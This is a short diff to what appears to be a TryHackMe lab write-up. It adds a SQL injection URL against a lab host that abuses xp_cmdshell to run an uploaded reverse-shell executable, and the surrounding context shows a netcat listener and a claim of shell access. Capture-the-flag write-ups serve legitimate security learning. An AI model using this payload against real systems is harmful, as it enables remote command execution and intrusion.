@@ -76,6 +76,10 @@ nc -lvnp 4444
 
 Then we need to execute the exe file in the victim side. Just by typing in the URL
 
+```
+http://10.10.82.81/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
+```
+
 ![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/14f82251-691c-42e0-bf2c-26538034d7cc)
 
 After that we will get the command line to the victim's machine now we have root access to their machine....
